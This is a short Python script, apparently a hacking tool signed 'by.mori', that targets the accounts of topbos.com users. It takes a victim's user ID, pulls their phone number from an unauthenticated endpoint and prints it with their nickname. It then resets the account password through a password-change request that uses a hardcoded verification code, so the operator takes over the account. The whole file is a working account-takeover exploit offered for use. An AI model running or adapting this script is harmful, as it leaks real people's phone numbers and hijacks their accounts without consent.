import requests
import urllib3
import time
import os
import json

os.system('clear')
print("""

██╗    ██╗███████╗ ██████╗██████╗ 
██║    ██║██╔════╝██╔════╝╚════██╗
██║ █╗ ██║███████╗██║      █████╔╝
██║███╗██║╚════██║██║     ██╔═══╝ 
╚███╔███╔╝███████║╚██████╗███████╗
 ╚══╝╚══╝ ╚══════╝ ╚═════╝╚══════╝by.mori
	""")
userid = input('ID: ')
response = requests.get('https://www.topbos.com/shop/getUserInfo.do?userId='+userid)
log = response.json()
if log['message'][5:7] == '08':
    nomor = log['message'][5:]
    print("Number Phone: "+str(nomor))
    name = requests.get('https://www.topbos.com/web/infullRequest.do?userId='+userid+'&costKey=com.neptune.domino.coincard0035&infullType=4&version=1.68').json()
    print('Login to Account '+str(name['message']['nickName']))
    newpass = input('New Password: ')
    response2 = requests.post('https://www.topbos.com/shop/changePwdIndex.do?userId='+userid+'&bindPhone='+nomor+'&code=3247&secondPwd='+newpass+'&sendCodeFlag=0')
    log2 = response2.json()
    if log2['code'] == '0':
        print('Password Changed Successfully')
    else:
            print(log2['message'])
else:
    print(log['message'])